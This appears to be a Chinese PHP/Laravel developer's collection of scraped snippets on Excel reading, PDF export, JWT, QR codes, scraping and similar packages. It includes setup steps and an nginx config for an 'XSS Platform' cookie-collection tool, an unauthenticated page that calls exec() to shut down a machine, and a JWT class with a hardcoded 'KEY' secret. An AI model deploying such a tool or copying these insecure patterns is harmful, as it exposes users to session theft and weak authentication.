* @var int */ private $rows = 0; /** * 程序运行消耗的时间(s) * @var int */ private $timeUsage = 0; /** * 程序运行消耗的内存(byte) * @var int */ private $memoryUsage = 0; /** * Create a new command instance. * * @return void */ public function __construct() &#123; parent::__construct(); &#125; /** * @throws \Exception */ public function handle() &#123; $path = $this-&gt;argument('path'); $option = $this-&gt;option('drive'); switch ($option) &#123; case 'laravel-excel': $this-&gt;useLaravelExcelDrive($path); break; case 'spout': $this-&gt;useSpoutDrive($path); break; default: throw new \Exception('Invalid option ' . $option); &#125; $this-&gt;info(sprintf('共读取数据：%s 行', $this-&gt;rows)); $this-&gt;info(sprintf('共耗时：%s秒', $this-&gt;timeUsage)); $this-&gt;info(sprintf('共消耗内存: %sM', $this-&gt;memoryUsage / 1024 / 1024)); &#125; private function useSpoutDrive($path) &#123; ini_set('memory_limit', -1); $start = now(); $reader = ReaderFactory::create(Type::XLSX); $reader-&gt;setShouldFormatDates(true); $reader-&gt;open(storage_path('app/'.$path)); $rows = []; foreach ($reader-&gt;getSheetIterator() as $sheet) &#123; foreach ($sheet-&gt;getRowIterator() as $row) &#123; $this-&gt;rows++; $rows[] = $row; &#125; &#125; $this-&gt;timeUsage = now()-&gt;diffInSeconds($start); $this-&gt;memoryUsage = xdebug_peak_memory_usage(); &#125; private function useLaravelExcelDrive($path) &#123; $start = now(); Settings::setLibXmlLoaderOptions(LIBXML_COMPACT | LIBXML_PARSEHUGE); ini_set('memory_limit', -1); $array = Excel::toArray(new TestImport(), $path); $this-&gt;rows = count($array[0]); $this-&gt;timeUsage = now()-&gt;diffInSeconds($start); $this-&gt;memoryUsage = xdebug_peak_memory_usage(); &#125;&#125;php artisan make:import TestImport&lt;?phpnamespace App\Imports;use Illuminate\Support\Collection;use Maatwebsite\Excel\Concerns\ToArray;use Maatwebsite\Excel\Concerns\ToCollection;use Maatwebsite\Excel\Concerns\WithChunkReading;class TestImport&#123;&#125;php artisan excel:read public/test.xlsxphp artisan excel:read public/test.xlsx --drive=spout B 站直播实用脚本123456789101112131415161718192021222324252627282930313233$ git clone https://github.com/metowolf/BilibiliHelper.git$ cd BilibiliHelper$ cp config.example config$ composer install$ php index.php[2018-12-12 13:58:33] Bilibili.DEBUG: POST: https://api.live.bilibili.com/User/userOnlineHeart[2018-12-12 13:58:33] Bilibili.DEBUG: &#123;"code":0,"msg":"OK","message":"OK","data":&#123;"giftlist":[]&#125;&#125;[2018-12-12 13:58:33] Bilibili.INFO: 向直播间 3746256 发送心跳包 (web)[2018-12-12 13:58:33] Bilibili.DEBUG: POST: https://api.live.bilibili.com/mobile/userOnlineHeart[2018-12-12 13:58:33] Bilibili.DEBUG: &#123;"code":0,"msg":"OK","message":"OK","data":&#123;"giftlist":[]&#125;&#125;[2018-12-12 13:58:33] Bilibili.INFO: 向直播间 3746256 发送心跳包 (APP)[2018-12-12 13:58:33] Bilibili.DEBUG: GET: https://api.live.bilibili.com/lottery/v1/SilverBox/getCurrentTask[2018-12-12 13:58:33] Bilibili.DEBUG: &#123;"code":0,"msg":"","message":"","data":&#123;"minute":3,"silver":30,"time_start":1544594312,"time_end":1544594492,"times":1,"max_times":3&#125;&#125;[2018-12-12 13:58:33] Bilibili.NOTICE: 领取宝箱成功，内含 30 个瓜子[2018-12-12 13:58:33] Bilibili.INFO: 等待 3 分钟后打开宝箱[2018-12-12 13:58:33] Bilibili.INFO: 检查每日任务# vi /usr/lib/systemd/system/bilibili.service[Unit]Description=Bilibili Helper ManagerDocumentation=https://github.com/metowolf/BilibiliHelperAfter=network.target[Service]ExecStart=/usr/bin/php /root/BilibiliHelper/index.phpRestart=always[Install]WantedBy=multi-user.target$ systemctl restart bilibili[root@VM_0_14_centos BilibiliHelper]# ps aux|grep bili|grep -v greproot 7987 1.6 1.0 317640 19012 ? Ss 14:03 0:00 /usr/bin/php /root/BilibiliHelper/index.php XSS Platform123456789101112131415161718192021222324252627//https://laravel-china.org/articles/20815#git clone https://github.com/78778443/xssplatform.git#vi /etc/nginx/nginx.confserver &#123; listen 80; server_name xss.localhost; root /Users/song/mycode/safe/xssplatform/; rewrite "^/([0-9a-zA-Z]&#123;6&#125;)$" /index.php?do=code&amp;urlKey=$1 last; rewrite "^/do/auth/(\w+?)(/domain/([\w\.]+?))?$" /index.php?do=do&amp;auth=$1&amp;domain=$3 last; rewrite "^/register/(.*?)$" /index.php?do=register&amp;key=$1 last; rewrite "^/register-validate/(.*?)$" /index.php?do=register&amp;act=validate&amp;key=$1 last; location / &#123; index index.html index.htm index.php; &#125; location ~ \.php$ &#123; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125;&#125;#nginx -s reload 生成小程序图文海报123456789101112https://laravel-china.org/articles/18418composer require ibrand/laravel-miniprogram-poster 低于 Laravel5.5 版本，config/app.php 文件中 'providers' 添加iBrand\Poster\PhantoMmagickServiceProvider::class图片保存在 storage/app/public 下所以需要执行 php artisan storage:link如需自定义配置请执行 php artisan vendor:publish --provider="iBrand\Poster\PhantoMmagickServiceProvider" --tag="config"use iBrand\Miniprogram\Poster\MiniProgramShareImg;$url = 'https://www.ibrand.cc/';$result = MiniProgramShareImg::generateShareImage($url); HTML 导出 PDF1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465//https://laravel-china.org/articles/21905 https://github.com/niklasravnsborg/laravel-pdf下载 https://wkhtmltopdf.org/downloads.htmlwkhtmltopdf https://www.baidu.com 1.pdf$ wkhtmltopdf.exe --lowquality "http://www.baidu.com" baidu.pdfLoading pages (1/6)libpng warning: iCCP: known incorrect sRGB profile ] 35%libpng warning: iCCP: known incorrect sRGB profile ] 41%libpng warning: iCCP: known incorrect sRGB profile ] 46%Counting pages (2/6)Resolving links (4/6)Loading headers and footers (5/6)Printing pages (6/6)Donecomposer require barryvdh/laravel-snappy将ServiceProvider添加到config / app.php中的providers数组Barryvdh\Snappy\ServiceProvider::class,添加facade到config / app.php中的aliases数组中'PDF' =&gt; Barryvdh\Snappy\Facades\SnappyPdf::class,'SnappyImage' =&gt; Barryvdh\Snappy\Facades\SnappyImage::class,生成配置文件php artisan vendor:publish --provider="Barryvdh\Snappy\ServiceProvider"vi config/snappy.phpbinary=&gt;'D:\laragon\www\source\wkhtmltopdf\bin\wkhtmltopdf.exe'# 下载$pdf = \PDF::loadView('welcome', $data);return $pdf-&gt;download('welcome.pdf');# 渲染页面$html = '&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;/head&gt;&lt;h1&gt;订单id&lt;/h1&gt;&lt;h2&gt;12346546&lt;/h2&gt;&lt;/html&gt;';$pdf = \PDF::loadHTML($html);return $pdf-&gt;inline();$pdf = \App::make('snappy.pdf.wrapper');$pdf-&gt;loadHTML('&lt;h1&gt;Test&lt;/h1&gt;');return $pdf-&gt;inline();return PDF::loadFile('http://www.github.com')-&gt;inline('github.pdf');$snappy = \App::make('snappy.pdf');//To file$html = '&lt;h1&gt;Bill&lt;/h1&gt;&lt;p&gt;You owe me money, dude.&lt;/p&gt;';$snappy-&gt;generateFromHtml($html, '/tmp/bill-123.pdf');$snappy-&gt;generate('http://www.github.com', '/tmp/github.pdf');#门面（facade）加载HTML字符串、文件或者视图#stream()方法显示在浏览器中#save()方法保存到文件#download()方法下载$pdf = PDF::loadView('pdf.invoice', $data);return $pdf-&gt;download('invoice.pdf');#链式操作return PDF::loadFile('file.html')-&gt;save('file.pdf')-&gt;stream('download.pdf');#方向PDF::loadHTML($html)-&gt;setPaper('a4', 'landscape')-&gt;setWarnings(false)-&gt;save('file.pdf')#生成图片$pdf = SnappyImage::loadView('pdf.invoice', $data);return $pdf-&gt;download('invoice.image');https://php1024.com/posts/45.htm zip123456789101112131415161718192021//https://laravel-china.org/topics/21368composer require chumper/zipper$zipper = new \Chumper\Zipper\Zipper;// https://github.com/Chumper/Zipper https://github.com/Ne-Lexa/php-zip$zipper-&gt;make('test.zip')-&gt;folder('test')-&gt;add('composer.json');$zipper-&gt;zip('test.zip')-&gt;folder('test')-&gt;add('composer.json','test');$zipper-&gt;remove('composer.lock');$zipper-&gt;folder('mySuperPackage')-&gt;add( array( 'vendor', 'composer.json' ),);$zipper-&gt;getFileContent('mySuperPackage/composer.json');$zipper-&gt;make('test.zip')-&gt;extractTo('',array('mySuperPackage/composer.json'),Zipper::WHITELIST);$zipper-&gt;close(); Walle-瓦力上线部署系统正确安装123https://www.phpsong.com/2166.htmlmkdir -p /data/www/walle-web &amp;&amp; cd /data/www/walle-web # 新建目录git clone git@github.com:meolu/walle-web.git . # 代码检出 api文档swagger12345678910111213141516171819202122232425262728293031//https://github.com/zircote/swagger-php$ composer global require zircote/swagger-phpChanged current directory to C:/Users/suping3/AppData/Roaming/Composer 1/2: https://packagist.laravel-china.org/p/provider-latest$37c8735b09b76040c9a255538c478903f6395d36efb59ce8ad13018c0e87dea7.json 2/2: https://packagist.laravel-china.org/p/provider-2018-10$6a20a9e7d4e44c231d13cc94ff3b58d88abbec0d6ca0a8aa8e2178d4569d0ea4.json Finished: success: 2, skipped: 0, failure: 0, total: 2Using version ^3.0 for zircote/swagger-php./composer.json has been updatedLoading composer repositories with package informationUpdating dependencies (including require-dev)Package operations: 1 install, 0 updates, 0 removals - Installing zircote/swagger-php (3.0.2): Loading from cacheWriting lock fileGenerating autoload filessuping3@BJ-D-212361A MINGW64 /d/php_study/PHPTutorial/WWW/laravel$ vendor/bin/openapi --helpUsage: openapi [--option value] [/path/to/project ...]Options: --output (-o) Path to store the generated documentation. ex: --output openapi.yaml --exclude (-e) Exclude path(s). ex: --exclude vendor,library/Zend --bootstrap (-b) Bootstrap a php file for defining constants, etc. ex: --bootstrap config/constants.php --processor Register an additional processor. --format Force yaml or json. --debug Show additional error information. --help (-h) Display this help message. 手机上利用PHP完成对电脑的操作12345678910111213141516171819202122232425//http://www.helpergarden.com/2014/03/%e5%9c%a8%e6%89%8b%e6%9c%ba%e4%b8%8a%e5%88%a9%e7%94%a8php%e5%ae%8c%e6%88%90%e5%af%b9%e7%94%b5%e8%84%91%e7%9a%84%e6%93%8d%e4%bd%9c.html&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"/&gt;&lt;style&gt; a&#123;font-size: 32px;&#125;&lt;/style&gt;&lt;a href="?type=cancle"&gt;取消关机&lt;/a&gt;&lt;br&gt;&lt;br&gt;&lt;a href="?type=close"&gt;关机&lt;/a&gt;&lt;?php$type=isset($_GET['type'])?$_GET['type']:false;$cmd='';switch ($type)&#123; case 'cancle': $cmd="shutdown -a"; break; case 'close': $cmd="shutdown -f -s -t 120"; break; default: $cmd=''; break;&#125;if(!empty($cmd)) exec($cmd);?&gt; 隐藏你的 ID1234567891011121314151617181920212223242526272829303132//https://laravel-china.org/articles/18335composer require 96qbhy/hyidphp artisan vendor:publish --provider=Qbhy\Hyid\ServiceProviderclass User extends Model&#123; use Qbhy\Hyid\HyidAble; // or public function getUserId($userId)&#123; return hyid($userId); &#125; // or public function toArray()&#123; $data = parent::toArray(); $data['id'] = hyid()-&gt;encode($data['id']) return $data; &#125;&#125;// decode public function userinfo($id)&#123; return User::query()-&gt;findOrFail(hyid()-&gt;decode($id))-&gt;toArray(); &#125;// 非 laravel or lumen 下，可以自行实例化 Hyid 类$secret = 'qbhy';$offset = 1996;$randomLength = 6;$hyid = new Hyid($secret,$offset,$randomLength);$encodedId = $hyid-&gt;encode(1);$id = $hyid-&gt;decode($encodedId); 书童机器人123456https://laravel-china.org/articles/6429/lang-jelly-robot-chat-with-you$ git clone https://github.com/jormin/robot.git$ composer install$ cd /path/to/robot$ cp .env.example .env$ php artisan key:generate 格式化sql123456789require_once('SqlFormatter.php');//https://github.com/jdorn/sql-formatter/blob/master/lib/SqlFormatter.php$query = "SELECT count(*),`Column1`,`Testing`, `Testing Three` FROM `Table1` WHERE Column1 = 'testing' AND ( (`Column2` = `Column3` OR Column4 &gt;= NOW()) ) GROUP BY Column1 ORDER BY Column3 DESC LIMIT 5,10";echo SqlFormatter::format($query);echo SqlFormatter::format($query, false);echo SqlFormatter::compress($query); jwt123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137&lt;?phpnamespace App;class JwtBase &#123; //头部 private static $header=array( 'alg'=&gt;'HS256', //生成signature的算法 'typ'=&gt;'JWT' //类型 ); //使用HMAC生成信息摘要时所使用的密钥 private static $key='KEY'; /** * 获取jwt token * @param array $payload jwt载荷 格式如下非必须 * [ * 'iss'=&gt;'jwt_admin', //该JWT的签发者 * 'iat'=&gt;time(), //签发时间 * 'exp'=&gt;time()+7200, //过期时间 * 'nbf'=&gt;time()+60, //该时间之前不接收处理该Token * 'sub'=&gt;'www.admin.com', //面向的用户 * 'jti'=&gt;md5(uniqid('JWT').time()) //该Token唯一标识 * ] * @return bool|string */ public static function getToken(array $payload) &#123; $arr = [ 'iss'=&gt;'yamecent', //该JWT的签发者 'iat'=&gt;time(), //签发时间 'exp'=&gt;time()+3600*24*15, //过期时间 'nbf'=&gt;time(), //该时间之前不接收处理该Token 'sub'=&gt;'', //面向的用户 'jti'=&gt;md5(uniqid('JWT').time()) //该Token唯一标识 ]; $payload = array_merge($arr,$payload); if(is_array($payload)) &#123; $base64header=self::base64UrlEncode(json_encode(self::$header,JSON_UNESCAPED_UNICODE)); $base64payload=self::base64UrlEncode(json_encode($payload,JSON_UNESCAPED_UNICODE)); $token=$base64header.'.'.$base64payload.'.'.self::signature($base64header.'.'.$base64payload,self::$key,self::$header['alg']); return $token; &#125;else&#123; return false; &#125; &#125; /** * 验证token是否有效,默认验证exp,nbf,iat时间 * @param string $Token 需要验证的token * @return bool|string */ public static function verifyToken(string $Token) &#123; $tokens = explode('.', $Token); if (count($tokens) != 3) return false; list($base64header, $base64payload, $sign) = $tokens; //获取jwt算法 $base64decodeheader = json_decode(self::base64UrlDecode($base64header), JSON_OBJECT_AS_ARRAY); if (empty($base64decodeheader['alg'])) return false; //签名验证 if (self::signature($base64header . '.' . $base64payload, self::$key, $base64decodeheader['alg']) !== $sign) return false; $payload = json_decode(self::base64UrlDecode($base64payload), JSON_OBJECT_AS_ARRAY); //签发时间大于当前服务器时间验证失败 if (isset($payload['iat']) &amp;&amp; $payload['iat'] &gt; time()) return false; //过期时间小宇当前服务器时间验证失败 if (isset($payload['exp']) &amp;&amp; $payload['exp'] &lt; time()) return false; //该nbf时间之前不接收处理该Token if (isset($payload['nbf']) &amp;&amp; $payload['nbf'] &gt; time()) return false; return $payload; &#125; /** * base64UrlEncode https://jwt.io/ 中base64UrlEncode编码实现 * @param string $input 需要编码的字符串 * @return string */ private static function base64UrlEncode(string $input) &#123; return str_replace('=', '', strtr(base64_encode($input), '+/', '-_')); &#125; /** * base64UrlEncode https://jwt.io/ 中base64UrlEncode解码实现 * @param string $input 需要解码的字符串 * @return bool|string */ private static function base64UrlDecode(string $input) &#123; $remainder = strlen($input) % 4; if ($remainder) &#123; $addlen = 4 - $remainder; $input .= str_repeat('=', $addlen); &#125; return base64_decode(strtr($input, '-_', '+/')); &#125; /** * HMACSHA256签名 https://jwt.io/ 中HMACSHA256签名实现 * @param string $input 为base64UrlEncode(header).".".base64UrlEncode(payload) * @param string $key * @param string $alg 算法方式 * @return mixed */ private static function signature(string $input, string $key, string $alg = 'HS256') &#123; $alg_config=array( 'HS256'=&gt;'sha256' ); return self::base64UrlEncode(hash_hmac($alg_config[$alg], $input, $key,true)); &#125;&#125;$token = \App\JwtBase::getToken(['user_id'=&gt;666]);//生成token $data = \App\JwtBase::verifyToken($token); dump($data); array:7 [▼ "iss" =&gt; "yamecent" "iat" =&gt; 1547186866 "exp" =&gt; 1548482866 "nbf" =&gt; 1547186866 "sub" =&gt; "" "jti" =&gt; "fbb7cbfd4f962dfb6ff193e28f09b6e2" "user_id" =&gt; 666 ] php版为所欲为123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123# 安装 epel 库，如果以前装过可以不用yum install -y epel-release# 引入 nux.ro 的库rpm --import http://li.nux.ro/download/nux/RPM-GPG-KEY-nux.ro rpm -Uvh http://li.nux.ro/download/nux/dextop/el7/x86_64/nux-dextop-release-0-5.el7.nux.noarch.rpm# 执行安装yum install ffmpeg摘抄自：https://sendya.me/centos-yum-install-ffmpeg-lib/安装字体 https://blog.csdn.net/wlwlwlwl015/article/details/51482065git clone https://github.com/PrintNow/php-sorry-gifcd php-sorry-gifps aux |grep fpm chown -R nobody:nobody /usr/share/nginx/html/php-sorry-gif/访问 http://118.24.158.116:8888/php-sorry-gif/index.php#weisuoyuweijs 版$ git clone https://github.com/WincerChan/Meme-generatorCloning into 'Meme-generator'...remote: Enumerating objects: 30, done.remote: Counting objects: 100% (30/30), done.remote: Compressing objects: 100% (23/23), done.remote: Total 488 (delta 13), reused 22 (delta 7), pack-reused 458Receiving objects: 100% (488/488), 7.50 MiB | 545.00 KiB/s, done.Resolving deltas: 100% (280/280), done.$ cd Meme-generator/$ yarn installyarn install v1.9.4[1/4] Resolving packages...[2/4] Fetching packages...info fsevents@1.2.4: The platform "win32" is incompatible with this module.info "fsevents@1.2.4" is an optional dependency and failed compatibility check. Excluding it from installation.[3/4] Linking dependencies...[4/4] Building fresh packages...Done in 50.18s.$ yarn startyarn run v1.9.4$ react-scripts startStarting the development server...Compiled successfully!You can now view meme in the browser. Local: http://localhost:3000/ On Your Network: http://10.235.51.40:3000/Note that the development build is not optimized.To create a production build, use yarn build.python 版$ pip install flask pillow imageio ffmpeg-python moviepyRequirement already satisfied: flask in d:\python\lib\site-packages (0.12.4)Collecting pillow Downloading https://files.pythonhosted.org/packages/d7/ea/46fd5bd57c5df5a2e79e508294acec4be0fcc2fb3ce95c2cf1038ebaa533/Pillow-5.4.1-cp37-cp37m-win32.whl (1.7MB)Collecting imageio Downloading https://files.pythonhosted.org/packages/28/b4/cbb592964dfd71a9de6a5b08f882fd334fb99ae09ddc82081dbb2f718c81/imageio-2.4.1.tar.gz (3.3MB)Collecting ffmpeg-python Downloading https://files.pythonhosted.org/packages/3d/10/330cbc8e63d072d40413f4d470444a6a1e8c8c6a80b2a4ac302d1252ca1b/ffmpeg_python-0.1.17-py3-none-any.whlCollecting moviepy Downloading https://files.pythonhosted.org/packages/1f/af/98b68b047c47d9430cb4c9ac899cf9d969de3936f888072991ea74da93a8/moviepy-0.2.3.5.tar.gz (372kB)Requirement already satisfied: click&gt;=2.0 in d:\python\lib\site-packages (from flask) (6.7)Requirement already satisfied: Jinja2&gt;=2.4 in d:\python\lib\site-packages (from flask) (2.10)Requirement already satisfied: Werkzeug&gt;=0.7 in d:\python\lib\site-packages (from flask) (0.14.1)Requirement already satisfied: itsdangerous&gt;=0.21 in d:\python\lib\site-packages (from flask) (0.24)Requirement already satisfied: numpy in d:\python\lib\site-packages (from imageio) (1.15.1)Requirement already satisfied: future in d:\python\lib\site-packages (from ffmpeg-python) (0.16.0)Requirement already satisfied: decorator&lt;5.0,&gt;=4.0.2 in d:\python\lib\site-packages (from moviepy) (4.3.0)Collecting tqdm&lt;5.0,&gt;=4.11.2 (from moviepy) Downloading https://files.pythonhosted.org/packages/d1/f9/8cbd36ef8bf84c5281e4943eaa12fe34850a0e8204e44872d8ca0c0ec741/tqdm-4.29.0-py2.py3-none-any.whl (46kB)Requirement already satisfied: MarkupSafe&gt;=0.23 in d:\python\lib\site-packages (from Jinja2&gt;=2.4-&gt;flask) (1.0)Building wheels for collected packages: imageio, moviepy Running setup.py bdist_wheel for imageio: started Running setup.py bdist_wheel for imageio: finished with status 'done' Stored in directory: C:\Users\suping3\AppData\Local\pip\Cache\wheels\e0\43\31\605de9372ceaf657f152d3d5e82f42cf265d81db8bbe63cde1 Running setup.py bdist_wheel for moviepy: started Running setup.py bdist_wheel for moviepy: finished with status 'done' Stored in directory: C:\Users\suping3\AppData\Local\pip\Cache\wheels\ad\92\4d\a6c6307d4c2219d002646bd4a5987e31fd5697f6ea7778b2c0Successfully built imageio moviepyInstalling collected packages: pillow, imageio, ffmpeg-python, tqdm, moviepySuccessfully installed ffmpeg-python-0.1.17 imageio-2.4.1 moviepy-0.2.3.5 pillow-5.4.1 tqdm-4.29.0suping3@BJ-D-212361A MINGW64 /d/code/Meme-generator (master)$ cd ..$ git clone https://github.com/East196/sorrypyCloning into 'sorrypy'...remote: Enumerating objects: 136, done.remote: Total 136 (delta 0), reused 0 (delta 0), pack-reused 136Receiving objects: 100% (136/136), 27.71 MiB | 230.00 KiB/s, done.Resolving deltas: 100% (55/55), done.Checking out files: 100% (48/48), done.$ cd sorrypy/$ python app.py * Restarting with stat * Debugger is active! * Debugger PIN: 139-127-258 * Running on http://127.0.0.1:8000/ (Press CTRL+C to quit)127.0.0.1 - - [11/Jan/2019 17:17:43] "GET / HTTP/1.1" 302 ---------------------------------------------------------------------------------DEBUG in app [app.py:18]:sorry--------------------------------------------------------------------------------127.0.0.1 - - [11/Jan/2019 17:17:43] "GET /tpl/sorry/ HTTP/1.1" 200 -127.0.0.1 - - [11/Jan/2019 17:17:43] "GET /static/w3.css HTTP/1.1" 200 -127.0.0.1 - - [11/Jan/2019 17:17:43] "GET /static/cookies.js HTTP/1.1" 200 -127.0.0.1 - - [11/Jan/2019 17:17:43] "GET /static/main.js HTTP/1.1" 200 -127.0.0.1 - - [11/Jan/2019 17:17:43] "GET /static/sorry/template.mp4 HTTP/1.1" 200 -127.0.0.1 - - [11/Jan/2019 17:17:43] "GET /favicon.ico HTTP/1.1" 404 - 采集数据123456789101112131415161718192021222324252627282930313233composer require jaeger/querylistuse QL\QueryList;//采集某页面所有的图片$data = QueryList::get('http://cms.querylist.cc/bizhi/453.html')-&gt;find('img')-&gt;attrs('src');//打印结果print_r($data-&gt;all());array:38 [▼ 0 =&gt; "/dedemao/images/logo.png" 1 =&gt; "/dedemao/ad/top.png" 2 =&gt; "/dedemao/ad/article_ad1.jpg" 3 =&gt; "http://img.ithome.com/newsuploadfiles/2013/8/20130828_083615_449.jpg"//采集某页面所有的超链接和超链接文本内容//可以先手动获取要采集的页面源码$html = file_get_contents('http://cms.querylist.cc/google/list_1.html');//然后可以把页面源码或者HTML片段传给QueryList$data = QueryList::html($html)-&gt;rules([ //设置采集规则 // 采集所有a标签的href属性 'link' =&gt; ['a','href'], // 采集所有a标签的文本内容 'text' =&gt; ['a','text']])-&gt;query()-&gt;getData();//打印结果print_r($data-&gt;all());array:186 [▼ 0 =&gt; array:2 [▼ "link" =&gt; "/" "text" =&gt; "" ] 1 =&gt; array:2 [▼ "link" =&gt; "/" "text" =&gt; "首页" ] ###12345678910111213141516171819docker pull hihozhou/opencvgit clone https://github.com/hihozhou/php-opencv.gitcd php-opencvphpize./configure --with-php-config=your php-config pathmakemake installuse function CV\&#123; imread, imshow, waitkey, namedWindow&#125;;$im = imread('Obama.png');//load imagenamedWindow('This is Obama id card',WINDOW_FULLSCREEN);//create windowimshow('This is Obama id card',$im);//show image on windowwaitkey(0);$gray = imread('Obama.png',IMREAD_GRAYSCALE);//oruse function CV\&#123; cvtColor&#125;;$gray = cvtColor($im, COLOR_BGR2GRAY); 中国城市关联123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566$ composer require eachdemo/city-linkage:dev-master# 发布资源文件$ php artisan vendor:publish --provider="Eachdemo\CityLinkage\CityServiceProvider"# 生成数据库 表$ php artisan migrateSchema::create('city_linkage', function (Blueprint $table) &#123; $table-&gt;increments('id'); $table-&gt;string('name'); $table-&gt;smallInteger('parent_id'); $table-&gt;string('pinyin'); $table-&gt;string('initial'); $table-&gt;string('initials'); $table-&gt;string('suffix'); $table-&gt;string('code'); $table-&gt;string('order'); &#125;);# 填充表数据$ php artisan db:seed --class=CitySeederIn Container.php line 752: Class CitySeeder does not exist$ composer dump-autoloadGenerating optimized autoload files&gt; Illuminate\Foundation\ComposerScripts::postAutoloadDump&gt; @php artisan package:discoverDiscovered Package: appstract/laravel-opcacheDiscovered Package: appstract/lush-httpDiscovered Package: barryvdh/laravel-dompdfDiscovered Package: barryvdh/laravel-snappyDiscovered Package: chumper/zipperDiscovered Package: darkaonline/l5-swaggerDiscovered Package: eachdemo/city-linkageDiscovered Package: encore/laravel-adminDiscovered Package: fideloper/proxyDiscovered Package: ibrand/laravel-database-loggerDiscovered Package: ibrand/laravel-miniprogram-posterDiscovered Package: intervention/imageDiscovered Package: jellybool/flysystem-upyunDiscovered Package: laravel/passportDiscovered Package: laravel/socialiteDiscovered Package: laravel/tinkerDiscovered Package: maatwebsite/excelDiscovered Package: mews/captchaDiscovered Package: nesbot/carbonDiscovered Package: niklasravnsborg/laravel-pdfDiscovered Package: socialiteproviders/managerDiscovered Package: tumobi/qqmap-regionDiscovered Package: tymon/jwt-authDiscovered Package: vetor/laravel-collectDiscovered Package: wenslim/editormdDiscovered Package: zgldh/qiniu-laravel-storagePackage manifest generated successfully.php artisan db:seed --class=CitySeeder 失败时可以执行先 composer dump-autoload 再执行 php artisan db:seed --class=CitySeeder 填充&lt;?phpnamespace App\Http\Controllers;use Illuminate\Http\Request;use Eachdemo\CityLinkage\CityLinkage;class DataController extends Controller&#123; public function test()&#123; $city = CityLinkage::getData(); # 获取所有省份城市 $city = CityLinkage::getData(1); # 获取北京市下所有区（北京id为1） &#125;&#125; 二维码1234567891011121314composer require endroid/qr-code//composer require simplesoftwareio/simple-qrcodeuse Endroid\QrCode\QrCode;$qrCode = new QrCode('Life is too short to be generating QR codes');header('Content-Type: '.$qrCode-&gt;getContentType());echo $qrCode-&gt;writeString();composer require khanamiryan/qrcode-detector-decoderuse Zxing\QrReader;$qrcode = new QrReader('path/to_image');$text = $qrcode-&gt;text(); //return decoded text from QR Code 生成 API 文档123456789101112131415161718192021222324252627282930313233composer require wxm/ddoc --devphp artisan vendor:publish --provider="Wxm\DDoc\DDocServiceProvider" --forcephp artisan servehttp://localhost:8000/ddocvi routes/web.phpnamespace App\Http\Controllers;/** * @Resource("登录令牌", uri="/token") */class AuthController extends Controller&#123; /** * 获取令牌 * * &gt; 通过手机号和密码获取会话`token`即登录凭证. * &gt; 需要认证的请求请携带此 Authorization 头 * &gt; * &gt; Authorization：Bearer &#123;token&#125; * &gt; * * @Post("/") * @Versions(&#123;"v1"&#125;) * @Response(200, body=&#123;"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9hcGkueHkudGVzdFwvc2Vzc2lvbiIsImlhdCI6MTU0NTIxNjM5OSwiZXhwIjoxNTQ1MjE5OTk5LCJuYmYiOjE1NDUyMTYzOTksImp0aSI6Im9pZjV4WTNqS2JkbEhzVmQiLCJzdWIiOjEsInBydiI6Ijg3ZTBhZjFlZjlmZDE1ODEyZmRlYzk3MTUzYTE0ZTBiMDQ3NTQ2YWEifQ.p3oAVkAxSCxTug5s6168N-ccfuCCywGDFiJ0b9zCXq8","token_type":"bearer","expires_in":3600&#125;) * @Parameters(&#123; * @Parameter("phone", type="integer", required=true, description="手机号."), * @Parameter("password", type="string", required=true, description="密码."), * &#125;) */ public function login() &#123; &#125; 生成identicon头像12345678composer require valiner/identicon-avatarrequire __DIR__.'/vendor/autoload.php';use Valiner\IdenticonAvatar\Identicon;$identicon = new Identicon();//浏览器输出'sdp'的125px的图像https://github.com/valiner/identicon-avatar$identicon-&gt;getAvatar('sdp',125); 像 cms 一样安装 Laravel 项目1234composer require rachidlaasri/laravel-installerphp artisan vendor:publish --tag=laravelinstallerphp artisan servelocalhost:8000/install update 全新 PHP 运行时环境123456789git clone https://github.com/polarphp/polarphp.gitcd polarphpgit submodule initgit submodule updategit checkout v0.0.1-alpha./devtools/scripts/build_polarphp.shdocker run --rm -it polarphp_debugpolar --version url 生成二维码123456789101112131415161718192021composer require "simplesoftwareio/simple-qrcode: ~2"QrCode::generate('Make me into a QrCode!');QrCode::generate('Make me into a QrCode!', '../public/qrcodes/qrcode.svg');QrCode::encoding('UTF-8')-&gt;generate('Make me a QrCode with special symbols ♠♥!!');QrCode::merge($filename, $percentage, $absolute);//Generates a QrCode with an image centered in the middle.QrCode::format('png')-&gt;merge('path-to-image.png')-&gt;generate();QrCode::BTC($address, $amount);//Sends a 0.334BTC payment to the addressQrCode::BTC('bitcoin address', 0.334);//Sends a 0.334BTC payment to the address with some optional argumentsQrCode::size(500)-&gt;BTC('address', 0.0034, [ 'label' =&gt; 'my label', 'message' =&gt; 'my message', 'returnAddress' =&gt; 'https://www.returnaddress.com']);QrCode::email('foo@bar.com');https://learnku.com/articles/19436#topnav gif图片转字符1234567https://github.com/hit9/gif2txtpython gif2txt.py test.gif -m 80 -o examples/out.htmlpython gif2txt.py test.gif -m 80 -o examples/withcolor.html -cpython gif2txt.py pacman.gif -o examples/pacman.html -c --green-screen-sensibility 128python gif2txt.py test.gif -r -o examples/reversegreenscreen.html在线浏览动图https://hit9.github.io/gif2txt/examples/out.html PHP 提取文章关键词123456789101112131415161718192021composer require fukuball/jieba-php:dev-master&lt;?php // index.phpinclude_once './vendor/autoload.php';ini_set('memory_limit', '600M');use Fukuball\Jieba\Jieba;use Fukuball\Jieba\Finalseg;use Fukuball\Jieba\JiebaAnalyse;Jieba::init(array('mode' =&gt; 'test', 'dict' =&gt; 'small'));Finalseg::init();JiebaAnalyse::init();$top_k = 10; // 获取前10个关键词$content = file_get_contents('./test.txt');$tags = JiebaAnalyse::extractTags($content, $top_k);var_dump($tags);https://blog.foof.dev/posts/php-0 音乐聚合搜索 php excel样式 快速Excel 